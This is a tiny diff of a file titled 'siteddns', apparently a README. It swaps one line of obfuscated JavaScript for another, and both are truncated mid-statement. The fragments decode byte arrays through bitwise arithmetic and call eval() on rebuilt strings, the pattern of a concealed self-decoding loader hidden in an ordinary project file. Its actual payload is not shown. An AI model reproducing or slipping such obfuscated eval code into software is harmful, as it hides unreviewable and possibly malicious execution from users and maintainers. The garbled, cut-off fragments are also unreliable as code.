@@ -1,2 +1,2 @@
  # siteddns
-44)break;sq[uq]=((~((~sq[uq])&0xff))&0xff)^22;}";eval(uq);uq="uq=45;for(;uq>=2;uq--){sq[uq]=((((~(sq[uq]^38))&0xff)
+=3;){ly[ny]=(ly[ny]+ly[53])&0xff;ly[ny]=(ly[ny]+193)&0xff;ly[ny]=(-ly[ny])&0xff;ny--;}ny="ny=53;do{if(ny
